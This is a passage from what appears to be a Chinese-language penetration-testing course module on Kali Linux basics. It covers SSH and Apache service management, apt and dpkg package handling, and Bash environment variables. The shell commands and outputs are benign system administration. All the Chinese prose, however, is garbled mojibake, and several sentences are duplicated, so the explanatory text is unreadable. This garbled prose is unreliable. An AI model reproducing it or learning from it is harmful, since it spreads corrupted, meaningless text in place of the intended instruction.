ssh\n```\n\nå½“å‘½ä»¤æˆåŠŸå®Œæˆåï¼Œå®ƒæ²¡æœ‰è¿”å›ä»»ä½•è¾“å‡ºï¼Œä½†æˆ‘ä»¬å¯ä»¥é€šè¿‡ä½¿ç”¨ ss å‘½ä»¤å’Œç®¡é“å°†è¾“å‡ºè¾“å…¥åˆ° grep æœç´¢ â€œsshdâ€ æ¥éªŒè¯ SSH æœåŠ¡æ­£åœ¨è¿è¡Œå¹¶åœ¨ TCP ç«¯å£ 22 ä¸Šç›‘å¬ã€‚è¾“å‡ºåˆ° grep ä¸­æœç´¢ â€œsshdâ€ã€‚\n\n```bash\nkali@kali:~$ sudo ss -antlp | grep sshd\nLISTEN 0      128             [::]:22           [::]:*    users:((\"sshd\",pid=470,fd=4))\nLISTEN 0      128            [::1]:6010         [::]:*    users:((\"sshd\",pid=1397352,fd=10))\n```\n\nå¦‚æœæˆ‘ä»¬æƒ³è®© SSH æœåŠ¡åœ¨å¯åŠ¨æ—¶è‡ªåŠ¨å¯åŠ¨ï¼ˆå°±åƒè®¸å¤šç”¨æˆ·å–œæ¬¢çš„é‚£æ ·ï¼‰ï¼Œæˆ‘ä»¬åªéœ€ä½¿ç”¨ systemctl å‘½ä»¤æ¥å¯ç”¨å®ƒã€‚ä½†æ˜¯ï¼Œä¸€å®šè¦å…ˆä¿®æ”¹é»˜è®¤å¯†ç ï¼\n\n```bash\nkali@kali:~$ sudo systemctl enable ssh\nSynchronizing state of ssh.service with SysV service script with /lib/systemd/systemd Executing: /lib/systemd/systemd-sysv-install enable ssh \nCreated symlink /etc/systemd/system/sshd.service â†’ /lib/systemd/system/ssh.service.\n```\n\næˆ‘ä»¬å¯ä»¥ä½¿ç”¨ systemctl æ¥å¯ç”¨å’Œåœç”¨ Kali Linux ä¸­çš„å¤§å¤šæ•°æœåŠ¡ã€‚\n\n### HTTP æœåŠ¡\n\nåœ¨æ¸—é€æµ‹è¯•ä¸­ï¼ŒApache HTTP æœåŠ¡ç»å¸¸è¢«ä½¿ç”¨ï¼Œè¦ä¹ˆç”¨äºæ‰˜ç®¡ç½‘ç«™ï¼Œè¦ä¹ˆæä¾›ä¸€ä¸ªå¹³å°å°†æ–‡ä»¶ä¸‹è½½åˆ°å—å®³è€…çš„æœºå™¨ã€‚HTTP æœåŠ¡æ˜¯åŸºäº TCP çš„ï¼Œé»˜è®¤ç›‘å¬ç«¯å£ä¸º 80ã€‚è¦åœ¨ Kali ä¸­å¯åŠ¨ HTTP æœåŠ¡ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ systemctlï¼Œå°±åƒæˆ‘ä»¬åœ¨å¯åŠ¨ SSH æœåŠ¡æ—¶ä¸€æ ·ã€‚æ¥å¯åŠ¨ HTTP æœåŠ¡ï¼Œæˆ‘ä»¬å¯ä»¥åƒå¯åŠ¨ SSH æœåŠ¡é‚£æ ·ä½¿ç”¨ systemctlï¼Œå°†æœåŠ¡åç§°æ›¿æ¢ä¸º â€œapache2â€ã€‚\n\n```bash\nkali@kali:~$ sudo systemctl start apache2\n```\n\nå’Œ SSH æœåŠ¡ä¸€æ ·ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨ ss å’Œ grep å‘½ä»¤æ¥éªŒè¯ HTTP æœåŠ¡æ˜¯å¦æ­£åœ¨è¿è¡Œå¹¶ç›‘å¬ TCP ç«¯å£ 80 ä¸Šè¿è¡Œå¹¶ç›‘å¬ï¼Œä½¿ç”¨ ss å’Œ grep å‘½ä»¤ã€‚\n\n```bash\nkali@kali:~$ sudo ss -antlp | grep apache\nLISTEN 0      128             :::80           :::*    users:((\"apache2\",pid=1481,fd=4),(\"apache2\",pid=1480,fd=4),(\"apache2\",pid=1479,fd=4),(\"apache2\",pid=1478,fd=4),(\"apache2\",pid=1477,fd=4),(\"apache2\",pid=1476,fd=4),(\"apache2\",pid=1475,fd=4))\n```\n\nä¸ºäº†è®© HTTP æœåŠ¡åœ¨å¯åŠ¨æ—¶å¯åŠ¨ï¼Œå°±åƒ SSH æœåŠ¡ä¸€æ ·ï¼Œæˆ‘ä»¬éœ€è¦æ˜ç¡®çš„å¯ç”¨å®ƒï¼Œå¹¶ä½¿ç”¨ systemctl çš„ enable é€‰é¡¹ã€‚\n\n```bash\nkali@kali:~$ sudo systemctl enable apache2\nSynchronizing state of apache2.service with SysV service script with /lib/systemd/syst Executing: /lib/systemd/systemd-sysv-install enable apache2\n```\n\nKali Linux ä¸­å¤§å¤šæ•°æœåŠ¡çš„æ“ä½œæ–¹å¼ä¸ SSH å’Œ HTTP åŸºæœ¬ç›¸åŒï¼Œéƒ½æ˜¯é€šè¿‡å…¶æœåŠ¡æˆ– init è„šæœ¬ã€‚è¦æŸ¥çœ‹æ‰€æœ‰å¯ç”¨æœåŠ¡çš„è¡¨æ ¼ï¼Œè¯·è¿è¡Œ systemctl çš„ list-unitfiles é€‰é¡¹ã€‚\n\n```bash\nkali@kali:~$ systemctl list-unit-files\n...\nUNIT FILE\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t                        STATE\nproc-sys-fs-binfmt_misc.automount \t\t\t\t\t\t                 \t\t\t\t\tstatic\n-.mount \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t               \t\t\t\t\tgenerated\ndev-hugepages.mount \t\t\t\t\t\t\t\t\t\t\t\t\t\t               \t\t\t\t\tstatic\ndev-mqueue.mount                                               \t\t\t\t\tstatic\nmedia-cdrom0.mount                                             \t\t\t\t\tgenerated\nproc-sys-fs-binfmt_misc.mount  \t\t\t\t\t\t                    \t\t\t\t\tstatic\nrun-vmblock\\\\x2dfuse.mount  \t\t\t\t\t\t                 \t\t        \t\t\tdisabled\nsys-fs-fuse-connections.mount  \t\t\t\t\t\t                 \t\t\t\t\t    static\nsys-kernel-config.mount  \t\t\t\t\t\t                 \t\t\t\t\t          static\nsys-kernel-debug.mount  \t\t\t\t\t\t                 \t\t\t\t\t          static\n...\n```\n\n## æœç´¢ã€å®‰è£…å’Œåˆ é™¤å·¥å…·\n\nKali VMware é•œåƒåŒ…å«äº†æ¸—é€æµ‹è¯•é¢†åŸŸä¸­æœ€å¸¸ç”¨çš„å·¥å…·ã€‚ç„¶è€Œï¼Œåœ¨ VMware é•œåƒä¸­åŒ…å« Kali èµ„æºåº“ä¸­å­˜åœ¨çš„æ¯ä¸€ä¸ªå·¥å…·ä¸­æ˜¯ä¸ç°å®çš„ã€‚å› æ­¤ï¼Œæˆ‘ä»¬éœ€è¦è®¨è®ºå¦‚ä½•æœç´¢ã€å®‰è£…æˆ–åˆ é™¤å·¥å…·ã€‚åœ¨æœ¬èŠ‚ä¸­ï¼Œæˆ‘ä»¬å°†æ¢è®¨é«˜çº§è½¯ä»¶åŒ…å·¥å…·ï¼ˆAPTï¼‰å·¥å…·é›†ä»¥åŠå…¶ä»–åœ¨ Kali Linux æ“ä½œç³»ç»Ÿä¸Šè¿›è¡Œç»´æŠ¤æ“ä½œæ—¶æœ‰ç”¨çš„å‘½ä»¤ã€‚APT æ˜¯ä¸€å¥—å¸®åŠ©ç®¡ç†è½¯ä»¶åŒ…æˆ–åº”ç”¨ç¨‹åºçš„å·¥å…·ï¼Œåœ¨åŸºäº Debian çš„ç³»ç»Ÿä¸­ã€‚ç”±äº Kali æ—¶åŸºäº Debian çš„ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ APT æ¥å®‰è£…å’Œåˆ é™¤åº”ç”¨ç¨‹åºï¼Œæ›´æ–°è½¯ä»¶åŒ…ï¼Œç”šè‡³å‡çº§æ•´ä¸ªç³»ç»Ÿã€‚APT çš„ç¥å¥‡ä¹‹å¤„åœ¨äºå®ƒæ˜¯ä¸€ä¸ªå®Œæ•´çš„è½¯ä»¶åŒ…ç®¡ç†ç³»ç»Ÿï¼Œé€šè¿‡é€’å½’åœ°æ»¡è¶³å…¶è¦æ±‚å’Œä¾èµ–å…³ç³»æ¥å®‰è£…æˆ–åˆ é™¤æ‰€è¦æ±‚çš„è½¯ä»¶åŒ…ã€‚\n\n### Apt update\n\næœ‰å…³ APT è½¯ä»¶åŒ…çš„ä¿¡æ¯è¢«ç¼“å­˜åœ¨æœ¬åœ°ï¼Œä»¥åŠ å¿«ä»»ä½•æ¶‰åŠæŸ¥è¯¢ APT æ•°æ®åº“çš„æ“ä½œã€‚å› æ­¤ï¼Œæ›´æ–°å¯ç”¨è½¯ä»¶åŒ…çš„åˆ—è¡¨ï¼ŒåŒ…æ‹¬ä¸å®ƒä»¬çš„ç‰ˆæœ¬ã€æè¿°ç­‰æœ‰å…³çš„ä¿¡æ¯ï¼Œå§‹ç»ˆæ˜¯ä¸€ä¸ªå¥½çš„åšæ³•ã€‚åŒ…çš„åˆ—è¡¨ï¼ŒåŒ…æ‹¬ä¸å®ƒä»¬çš„ç‰ˆæœ¬ã€æè¿°ç­‰ç›¸å…³çš„ä¿¡æ¯ã€‚æˆ‘ä»¬å¯ä»¥ç”¨ apt update å‘½ä»¤æ¥åšè¿™ä»¶äº‹ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š\n\n```bash\nkali@kali:~$ sudo apt update\nHit:1 <http://kali.mirror.globo.tech/kali> kali-rolling InRelease\nReading package lists... Done\nBuilding dependency tree\nReading state information... Done\n699 packages can be upgraded. Run 'apt list --upgradable' to see them.\n```\n\n### Apt upgrade\n\nåœ¨ APT æ•°æ®åº“è¢«æ›´æ–°åï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ apt upgrade å‘½ä»¤å°†å·²å®‰è£…çš„è½¯ä»¶åŒ…å’Œæ ¸å¿ƒç³»ç»Ÿå‡çº§åˆ°æœ€æ–°çš„ç‰ˆæœ¬ã€‚\n\nä¸ºäº†å‡çº§å•ä¸ªè½¯ä»¶åŒ…ï¼Œåœ¨ apt upgrade å‘½ä»¤åé¢åŠ ä¸Šè½¯ä»¶åŒ…çš„åå­—ã€‚ä¾‹å¦‚ apt upgrade metasploit-frameworkã€‚\n\n<aside> ğŸ’¡ è™½ç„¶ä½ å¯ä»¥åœ¨ä»»ä½•æ—¶å€™å‡çº§ä½ çš„Kali Linuxå®‰è£…ï¼Œä½†æœ€å¥½çš„åŠæ³•æ˜¯ åœ¨è¿™æ ·åšä¹‹å‰ï¼Œæœ€å¥½å…ˆåœ¨ä¸€ä¸ªå¹²å‡€çš„çŠ¶æ€ä¸‹å¯¹è™šæ‹Ÿæœºè¿›è¡Œå¿«ç…§ï¼ˆåœ¨åšä»»ä½•æ”¹å˜ä¹‹å‰ ä¹‹å‰ï¼‰è¿›è¡Œå¿«ç…§ã€‚è¿™æœ‰ä¸¤ä¸ªä¸»è¦å¥½å¤„ã€‚é¦–å…ˆï¼Œå®ƒå°† ç¡®ä¿ä½ æœ‰ä¸€ä¸ªç»è¿‡æµ‹è¯•çš„æ„å»ºçš„å¿«ç…§ï¼Œå¯ä»¥ç”¨äºæ‰€æœ‰çš„ç»ƒä¹  å…¶æ¬¡ï¼Œå¦‚æœä½ é‡åˆ°é—®é¢˜è€Œä¸å¾—ä¸è”ç³»æˆ‘ä»¬çš„æ”¯æŒå›¢é˜Ÿï¼Œä»–ä»¬ä¼š ä»–ä»¬ä¼šçŸ¥é“ä½ æ‰€ä½¿ç”¨çš„å·¥å…·çš„ç‰ˆæœ¬ä»¥åŠå®ƒä»¬çš„è¡Œä¸ºæ–¹å¼ã€‚å¯¹äºä¸€ä¸ªå®é™…çš„ æ¸—é€æµ‹è¯•ï¼Œè¿™äº›é—®é¢˜ä¹ŸåŒæ ·é€‚ç”¨ã€‚ä½ å°†äº†è§£æ›´å¤šå…³äºå¦‚ä½• å¦‚ä½•åœ¨æ‹¥æœ‰æœ€æ–°çš„å·¥å…·å’Œå€¼å¾—ä¿¡èµ–çš„æ„å»ºä¹‹é—´å–å¾—å¹³è¡¡ï¼Œå› ä¸ºä½ ä¼šè·å¾—æ›´å¤šçš„ ç»éªŒå’Œå¯¹Kali Linuxçš„ç†Ÿæ‚‰ç¨‹åº¦ã€‚\n\n</aside>\n\n### Apt-cache search å’Œ apt show\n\napt-cache æœç´¢å‘½ä»¤æ˜¾ç¤ºäº†å­˜å‚¨åœ¨å†…éƒ¨ç¼“å­˜çš„è½¯ä»¶åŒ…æ•°æ®ä¸­çš„å¤§éƒ¨åˆ†ä¿¡æ¯ã€‚ä¾‹å¦‚ï¼Œå‡è®¾æˆ‘ä»¬æƒ³é€šè¿‡ APT å®‰è£… pure-ftpd åº”ç”¨ç¨‹åºã€‚æˆ‘ä»¬è¦åšçš„ç¬¬ä¸€ä»¶äº‹æ˜¯æ‰¾å‡ºè¯¥åº”ç”¨ç¨‹åºæ˜¯å¦å­˜åœ¨äº kali Linux çš„ä»“åº“ä¸­ã€‚è¦åšåˆ°è¿™ä¸€ç‚¹ï¼Œæˆ‘ä»¬å°†åœ¨å‘½ä»¤è¡Œä¸­ä¼ é€’æœç´¢è¯ã€‚\n\n```bash\nkali@kali:~$ apt-cache search pure-ftpd\nmysqmail-pure-ftpd-logger - real-time logging system in MySQL - Pure-FTPd traffic-logg\npure-ftpd - Secure and efficient FTP server\npure-ftpd-common - Pure-FTPd FTP server (Common Files)\npure-ftpd-ldap - Secure and efficient FTP server with LDAP user authentication\npure-ftpd-mysql - Secure and efficient FTP server with MySQL user authentication\npure-ftpd-postgresql - Secure and efficient FTP server with PostgreSQL user authentica\nresource-agents - Cluster Resource Agents\n```\n\nä¸Šé¢çš„è¾“å‡ºè¡¨æ˜ï¼Œè¯¥åº”ç”¨ç¨‹åºå­˜åœ¨äºç‰ˆæœ¬åº“ä¸­ã€‚ä¹Ÿæœ‰ä¸€äº› pure-ftpd åº”ç”¨ç¨‹åºçš„è®¤è¯æ‰©å±•ï¼Œå¦‚æœéœ€è¦ï¼Œå¯ä»¥å®‰è£…ã€‚\n\næœ‰è¶£çš„æ˜¯ï¼Œèµ„æºä»£ç†åŒ…åœ¨æˆ‘ä»¬çš„æœç´¢ä¸­å‡ºç°äº†ï¼Œå°½ç®¡å…¶åç§°ä¸åŒ…å« \"pure-ftpd \"å…³é”®å­—ã€‚è¿™èƒŒåçš„åŸå› æ˜¯ï¼Œapt-cache æœç´¢ä¼šåœ¨è½¯ä»¶åŒ…çš„æè¿°ä¸­å¯»æ‰¾æ‰€éœ€çš„å…³é”®è¯ï¼Œè€Œä¸æ˜¯åœ¨è½¯ä»¶åŒ…çš„åç§°æœ¬èº«ã€‚\n\nä¸ºäº†ç¡®è®¤ resource-agents è½¯ä»¶åŒ…çš„æè¿°ç¡®å®åŒ…å« \"pure-ftpd \"è¿™ä¸ªå…³é”®è¯ã€‚å°†è½¯ä»¶åŒ…çš„åç§°ä¼ é€’ç»™ apt showï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚\n\n```bash\nkali@kali:~$ apt show resource-agents\nPackage: resource-agents\nVersion: 1:4.2.0-2\n...\nDescription: Cluster Resource Agents\nThis package contains cluster resource agents (RAs) compliant with the Open\nCluster Framework (OCF) specification, used to interface with various services\nin a High Availability environment managed by the Pacemaker resource manager.\n.\nAgents included:\n AoEtarget: Manages ATA-over-Ethernet (AoE) target exports\n AudibleAlarm: Emits audible beeps at a configurable interval\n ...\n NodeUtilization: Node Utilization\n Pure-FTPd: Manages a Pure-FTPd FTP server instance\n Raid1: Manages Linux software RAID (MD) devices on shared storage\n ...\n```\n\nåœ¨ä¸Šé¢çš„è¾“å‡ºä¸­ï¼Œapt show æ¾„æ¸…äº†ä¸ºä»€ä¹ˆèµ„æºä»£ç†ç¨‹åºåœ¨ä¹‹å‰æœç´¢ pure-ftpd æ—¶ç¥ç§˜åœ°æ˜¾ç¤ºå‡ºæ¥ã€‚\n\n### Apt install\n\napt install å‘½ä»¤å¯ä»¥ç”¨æ¥å°†ä¸€ä¸ªè½¯ä»¶åŒ…æ·»åŠ åˆ°ç³»ç»Ÿä¸­ï¼Œç”¨ apt install åé¢è·Ÿç€è½¯ä»¶åŒ…çš„åå­—ã€‚è®©æˆ‘ä»¬ç»§ç»­å®‰è£… pure-ftpdã€‚\n\n```bash\nkali@kali:~$ sudo apt install pure-ftpd\nReading package lists... Done\nBuilding dependency tree\nReading state information... Done\nThe following additional packages will be installed:\n pure-ftpd-common\nThe following NEW packages will be installed:\n pure-ftpd pure-ftpd-common\n0 upgraded, 2 newly installed, 0 to remove and 0 not upgraded.\nNeed to get 309 kB of archives.\nAfter this operation, 880 kB of additional disk space will be used.\nDo you want to continue? [Y/n] y\nGet:1 <http://kali.mirror.globo.tech/kali> kali-rolling/main amd64 pure-ftpd-common all\nGet:2 <http://kali.mirror.globo.tech/kali> kali-rolling/main amd64 pure-ftpd amd64 1.0.4\nFetched 309 kB in 4s (86.4 kB/s)\nPreconfiguring packages ...\n...\n```\n\nåŒæ ·åœ°ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨ apt remove --purgeå‘½ä»¤åˆ é™¤ä¸€ä¸ªè½¯ä»¶åŒ…ã€‚\n\n### Apt remove --purge\n\napt remove -purge å‘½ä»¤å¯ä»¥å®Œå…¨åˆ é™¤ Kali ä¸­çš„è½¯ä»¶åŒ…ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œç”¨ apt remove åˆ é™¤è½¯ä»¶åŒ…ä¼šåˆ é™¤æ‰€æœ‰çš„è½¯ä»¶åŒ…æ•°æ®ï¼Œä½†é€šå¸¸ä¼šç•™ä¸‹å°çš„ï¼ˆä¿®æ”¹è¿‡çš„ï¼‰ç”¨æˆ·é…ç½®æ–‡ä»¶ï¼Œä»¥é˜²åˆ é™¤æ˜¯æ„å¤–çš„ã€‚æ·»åŠ  --purge é€‰é¡¹å¯ä»¥åˆ é™¤æ‰€æœ‰é—ç•™ç‰©ã€‚\n\n```bash\nkali@kali:~$ sudo apt remove --purge pure-ftpd\nReading package lists... Done\nBuilding dependency tree\nReading state information... Done\nThe following package was automatically installed and is no longer required:\n pure-ftpd-common\nUse 'sudo apt autoremove' to remove it.\nThe following packages will be REMOVED:\n pure-ftpd*\n0 upgraded, 0 newly installed, 1 to remove and 0 not upgraded.\nAfter this operation, 581 kB disk space will be freed.\nDo you want to continue? [Y/n] y\n(Reading database ... 388024 files and directories currently installed.)\nRemoving pure-ftpd (1.0.47-3) ...\nCannot find cached rlinetd's config files for service ftp, ignoring remove request\nProcessing triggers for man-db (2.8.5-2) ...\n(Reading database ... 388011 files and directories currently installed.)\nPurging configuration files for pure-ftpd (1.0.47-3) ...\nProcessing triggers for systemd (240-6) ...\n```\n\n### Dpkg\n\ndpkg æ˜¯ç”¨äºå®‰è£…è½¯ä»¶åŒ…çš„æ ¸å¿ƒå·¥å…·ï¼Œå¯ä»¥ç›´æ¥æˆ–é—´æ¥åœ°é€šè¿‡ APT å®‰è£…ã€‚å®ƒä¹Ÿæ˜¯ç¦»çº¿æ“ä½œæ—¶ä½¿ç”¨çš„é¦–é€‰å·¥å…·ï¼Œå› ä¸ºå®ƒä¸éœ€è¦äº’è”ç½‘è¿æ¥ã€‚æ³¨æ„ï¼Œdpkg ä¸ä¼šå®‰è£…è½¯ä»¶åŒ…å¯èƒ½éœ€è¦çš„ä»»ä½•ä¾èµ–é¡¹ã€‚è¦ç”¨ dpkg å®‰è£…ä¸€ä¸ªè½¯ä»¶åŒ…ï¼Œè¯·æä¾› -i æˆ– --install é€‰é¡¹å’Œ .deb åŒ…æ–‡ä»¶çš„è·¯å¾„ã€‚è¿™å‡å®šè¦å®‰è£…çš„è½¯ä»¶åŒ…çš„ .deb æ–‡ä»¶å·²ç»è¢«ä¸‹è½½æˆ–é€šè¿‡å…¶ä»–æ–¹å¼è·å¾—ã€‚\n\n```bash\nkali@kali:~$ sudo dpkg -i man-db_2.7.0.2-5_amd64.deb\n(Reading database ... 86425 files and directories currently installed.)\nPreparing to unpack man-db_2.7.0.2-5_amd64.deb ...\nUnpacking man-db (2.7.0.2-5) over (2.7.0.2-4) ...\nSetting up man-db (2.7.0.2-5) ...\nUpdating database of manual pages ...\nProcessing triggers for mime-support (3.58) ...\n...\n```\n\n### ç»ƒä¹ \n\n(è¿™äº›ç»ƒä¹ ä¸éœ€è¦æŠ¥å‘Š)\n\n1. å¯¹ä½ çš„Kaliè™šæ‹Ÿæœºè¿›è¡Œå¿«ç…§ï¼ˆå¯é€‰ï¼‰ã€‚\n2. æœç´¢ä¸€ä¸ªå½“å‰æ²¡æœ‰å®‰è£…åœ¨Kaliä¸­çš„å·¥å…·ã€‚\n3. å®‰è£…è¯¥å·¥å…·ã€‚\n4. ç§»é™¤è¯¥å·¥å…·ã€‚\n5. å°†Kaliè™šæ‹Ÿæœºæ¢å¤åˆ°ä¹‹å‰æ‹æ‘„çš„å¿«ç…§ï¼ˆå¯é€‰ï¼‰ã€‚\n\n## ç»“æŸè¯­\n\nåœ¨è¿™ä¸ªæ¨¡å—ä¸­ï¼Œæˆ‘ä»¬ä¸ºå³å°†åˆ°æ¥çš„æ¨¡å—è®¾å®šäº†ä¸€ä¸ªåŸºçº¿ã€‚æˆ‘ä»¬æ¢è®¨äº†æ–°ç”¨æˆ·çš„æŠ€å·§å’Œçªé—¨ï¼Œå¹¶å›é¡¾äº†ä¸€äº›é«˜çº§ç”¨æˆ·å¯èƒ½ä¼šæ¬£èµçš„æ ‡å‡†ã€‚\n\næˆ‘ä»¬é¼“åŠ±æ‰€æœ‰å­¦ç”Ÿå›é¡¾KaliåŸ¹è®­ç½‘ç«™ä¸Šçš„å…è´¹åœ¨çº¿åŸ¹è®­$^{46}$ã€‚è¿™ä¸ªç½‘ç«™åŒ…æ‹¬ Kali Linux Revealed ä¸€ä¹¦ï¼Œæ—¨åœ¨æµ‹è¯•ä½ çš„ç†è§£çš„ç»ƒä¹ ï¼Œä¸€ä¸ªä¸“é—¨çš„æ”¯æŒè®ºå›ï¼Œä»¥åŠæ›´å¤šã€‚è¿™äº›å…è´¹èµ„æºä¸ºæ‰€æœ‰æŠ€èƒ½æ°´å¹³çš„ç”¨æˆ·æä¾›äº†æœ‰ä»·å€¼çš„è§è§£ï¼Œæ˜¯æœ¬è¯¾ç¨‹åŸ¹è®­çš„ä¸€ä¸ªå¾ˆå¥½çš„è¡¥å……ã€‚\n\n# å‘½ä»¤è¡Œçš„ä¹è¶£\n\n## Bash ç¯å¢ƒ\n\nBash æ˜¯ä¸€ä¸ªä¸ sh å…¼å®¹çš„shellï¼Œå®ƒå…è®¸æˆ‘ä»¬åœ¨ç»ˆç«¯çª—å£ä¸­è¿è¡Œå¤æ‚çš„å‘½ä»¤å¹¶æ‰§è¡Œä¸åŒçš„ä»»åŠ¡ã€‚å®ƒæ•´åˆäº† KornShell(ksh) å’Œ C shell(csh) çš„æœ‰ç”¨åŠŸèƒ½ã€‚\n\n### ç¯å¢ƒå˜é‡\n\nå½“æ‰“å¼€ä¸€ä¸ªç»ˆç«¯çª—å£æ—¶ï¼Œä¸€ä¸ªæ–°çš„ Bash è¿›ç¨‹ï¼Œå®ƒæœ‰è‡ªå·±çš„ç¯å¢ƒå˜é‡ï¼Œè¢«åˆå§‹åŒ–ã€‚è¿™äº›å˜é‡æ˜¯ä¸€ç§å…¨å±€å­˜å‚¨å½¢å¼ï¼Œç”¨äºå­˜å‚¨åœ¨ç»ˆç«¯ä¼šè¯ä¸­è¿è¡Œçš„ä»»ä½•åœ¨è¯¥ç»ˆç«¯ä¼šè¯ä¸­è¿è¡Œçš„åº”ç”¨ç¨‹åºæ‰€ç»§æ‰¿çš„å„ç§è®¾ç½®ã€‚å…¶ä¸­ä¸€ä¸ªæœ€å¸¸è¢«å¼•ç”¨çš„ç¯å¢ƒå˜é‡ä¹‹ä¸€æ˜¯ PATHï¼Œå®ƒæ˜¯ä¸€ä¸ªç”¨å†’å·åˆ†éš”çš„ç›®å½•è·¯å¾„åˆ—è¡¨ï¼ŒBash ä¼šåœ¨æ²¡æœ‰å‘½ä»¤çš„æƒ…å†µä¸‹æœç´¢è¿™äº›ç›®å½•ã€‚Bash ä¼šåœ¨è¿è¡Œæ²¡æœ‰å®Œæ•´è·¯å¾„çš„å‘½ä»¤æ—¶æœç´¢è¿™äº›ç›®å½•ã€‚æˆ‘ä»¬å¯ä»¥ç”¨ echo å‘½ä»¤æŸ¥çœ‹ä¸€ä¸ªç‰¹å®šçš„ç¯å¢ƒå˜é‡çš„å†…å®¹ï¼Œåœ¨è¯¥å‘½ä»¤åé¢åŠ ä¸Š å’Œä¸€ä¸ªç¯å¢ƒå˜é‡çš„åå­—ã€‚ä¾‹å¦‚ï¼Œè®©æˆ‘ä»¬çœ‹ä¸€ä¸‹ PATH ç¯å¢ƒå˜é‡çš„å†…å®¹ã€‚\n\n```bash\nkali@kali:~$ echo $PATH\n/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\n```\n\nå…¶ä»–ä¸€äº›æœ‰ç”¨çš„ç¯å¢ƒå˜é‡åŒ…æ‹¬ USERã€PWD å’Œ HOMEã€‚ç»ˆç«¯ç”¨æˆ·çš„ç”¨æˆ·åã€å½“å‰å·¥ä½œç›®å½•å’Œä¸»ç›®å½•ã€‚\n\n```bash\nkali@kali:~$ echo $USER\nkali\n\nkali@kali:~$ echo $PWD\n/home/kali\n\nkali@kali:~$ echo $HOME\n/home/kali\n```\n\nä¸€ä¸ªç¯å¢ƒå˜é‡å¯ä»¥ç”¨ export å‘½ä»¤æ¥å®šä¹‰ã€‚ä¾‹å¦‚ï¼Œå¦‚æœæˆ‘ä»¬æ­£åœ¨æ‰«æä¸€ä¸ªç›®æ ‡ï¼Œä¸æƒ³é‡å¤è¾“å…¥ç³»ç»Ÿçš„ IP åœ°å€ï¼Œæˆ‘ä»¬å¯ä»¥å¿«é€Ÿåœ°èµ‹äºˆå®ƒä¸€ä¸ªç¯å¢ƒå˜é‡å¹¶ä½¿ç”¨å®ƒæ¥ä»£æ›¿ã€‚\n\n```bash\nkali@kali:~$ export b=10.11.1.220\n\nkali@kali:~$ ping -c 2 $b\nPING 10.11.1.220 (10.11.1.220) 56(84) bytes of data.\n64 bytes from 10.11.1.220: icmp_seq=1 ttl=62 time=2.23 ms\n64 bytes from 10.11.1.220: icmp_seq=2 ttl=62 time=1.56 ms\n\n--- 10.11.1.220 ping statistics ---\n2 packets transmitted, 2 received, 0% packet loss, time 1002ms\nrtt min/avg/max/mdev = 1.563/1.900/2.238/0.340 ms\n```\n\nexport å‘½ä»¤ä½¿å¾—æˆ‘ä»¬å¯èƒ½ä»å½“å‰çš„ Bash å®ä¾‹ä¸­äº§ç”Ÿçš„ä»»ä½•å­è¿›ç¨‹éƒ½å¯ä»¥è®¿é—®è¯¥å˜é‡ã€‚å¦‚æœæˆ‘ä»¬åœ¨æ²¡æœ‰å¯¼å‡ºçš„æƒ…å†µä¸‹è®¾ç½®ä¸€ä¸ªç¯å¢ƒå˜é‡ï¼Œå®ƒå°†åªåœ¨å½“å‰çš„ shell ä¸­å¯ç”¨ã€‚æˆ‘ä»¬å°†ä½¿ç”¨ $$ å˜é‡æ¥æ˜¾ç¤ºå½“å‰ shell å®ä¾‹çš„è¿›ç¨‹ IDï¼Œä»¥ç¡®ä¿æˆ‘ä»¬ç¡®å®æ˜¯åœ¨ä¸¤ä¸ªä¸åŒçš„ shell ä¸­å‘å¸ƒå‘½ä»¤ã€‚\n\n```bash\nkali@kali:~$ echo \"$$\"\n1827\n\nkali@kali:~$ var=\"My Var\"\n\nkali@kali:~$ echo $var\nMy Var\n\nkali@kali:~$ bash\n\nkali@kali:~$ echo \"$$\"\n1908\n\nkali@kali:~$ echo $var\n\nkali@kali:~$ exit\nexit\n\nkali@kali:~$ echo $var\nMy Var\n\nkali@kali:~$ export othervar=\"Global Var\"\n\nkali@kali:~$ echo $othervar\nGlobal Var\n\nkali@kali:~$ bash\n\nkali@kali:~$ echo $othervar\nGlobal Var\n\nkali@kali:~$ exit\nexit\nkali@kali:~$\n```\n\nåœ¨ Kali Linux ä¸­è¿˜æœ‰è®¸å¤šå…¶ä»–é»˜è®¤å®šä¹‰çš„ç¯å¢ƒå˜é‡ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡åœ¨å‘½ä»¤è¡Œè¿è¡Œ env æ¥æŸ¥çœ‹è¿™äº›å˜é‡ã€‚\n\n```bash\nkali@kali:~$ env\nSHELL=/bin/bash\n...\nPWD=/home/kali\nXDG_SESSION_DESKTOP=lightdm-xsession\nLOGNAME=kali\nXDG_SESSION_TYPE=x11\nXAUTHORITY=/home/kali/.Xauthority\nXDG_GREETER_DATA_DIR=/var/lib/lightdm/data/kali\nHOME=/home/kali\n...\nTERM=xterm-256color\nUSER=k\n```\n\n### Tab è‡ªåŠ¨è¡¥å…¨\n\nBash shell çš„è‡ªåŠ¨è¡¥å…¨åŠŸèƒ½å…è®¸æˆ‘ä»¬ç”¨ `TAB` æ¥å®Œæˆæ–‡ä»¶åå’Œç›®å½•è·¯å¾„ã€‚`TAB` é”®æ¥å®Œæˆæ–‡ä»¶åå’Œç›®å½•è·¯å¾„ã€‚è¿™ä¸ªåŠŸèƒ½å¤§å¤§åŠ é€Ÿäº† shell çš„ä½¿ç”¨ï¼Œä»¥è‡³äºåœ¨å…¶ä»– shell ä¸­è¢«ä¸¥é‡é—æ¼ã€‚è®©æˆ‘ä»¬åœ¨ kali ç”¨æˆ·çš„ä¸»ç›®å½•ä¸‹çœ‹çœ‹å®ƒæ˜¯å¦‚ä½•å·¥ä½œçš„ã€‚æˆ‘ä»¬é¦–å…ˆè¾“å…¥ä»¥ä¸‹å‘½ä»¤ã€‚\n\n```bash\nkali@kali:~$ ls D[TAB]\nDesktop/ Documents/ Downloads/\n\nkali@kali:~$ ls 